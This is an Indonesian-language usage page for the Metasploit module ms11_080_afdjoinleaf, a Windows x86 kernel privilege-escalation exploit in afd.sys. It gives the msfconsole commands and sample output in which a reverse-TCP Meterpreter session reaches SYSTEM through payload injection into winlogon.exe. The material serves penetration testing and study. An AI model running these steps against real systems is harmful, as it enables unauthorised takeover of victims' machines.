# ms11_080_afdjoinleaf

Modul ini mengeksploitasi kelemahan pada fungsi `AfdJoinLeaf` di dalam driver `afd.sys` untuk menimpa data di ruang kernel. Sebuah alamat di dalam `HalDispatchTable` akan ditimpa, dan ketika dipicu melalui pemanggilan fungsi `NtQueryIntervalProfile`, maka akan menjalankan `shellcode`.

Modul ini akan menaikkan hak akses dirinya sendiri menjadi `SYSTEM`, lalu menyuntikkan payload ke dalam proses `SYSTEM` lain, sebelum mengembalikan token miliknya sendiri untuk menghindari ketidakstabilan sistem.

## Penulis
- [Matteo Memelli](https://www.crunchbase.com/person/matteo-memelli)
- [Spencer McIntyre](https://github.com/zerosteiner)

## Platform
- `Windows`

## Arsitektur
- `x86`

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/ms11_080_afdjoinleaf
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Kernel Base Address: 0x804d7000
[*] HalDispatchTable Address: 0x80553038
[*] HaliQuerySystemInformation Address: 0x80715bba
[*] HalpSetSystemInformation Address: 0x80718436
[*] Triggering AFDJoinLeaf pointer overwrite...
[*] Injecting the payload into SYSTEM process: winlogon.exe
[*] Creating the thread to execute in 0xaf0000 (pid=620)
[*] Sending stage (177734 bytes) to 192.168.1.54
[*] Restoring the original token...
[*] Meterpreter session 26 opened (192.168.1.11:4444 -> 192.168.1.54:1059) at 2025-05-17 08:17:32 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/ms11_080_afdjoinleaf/)
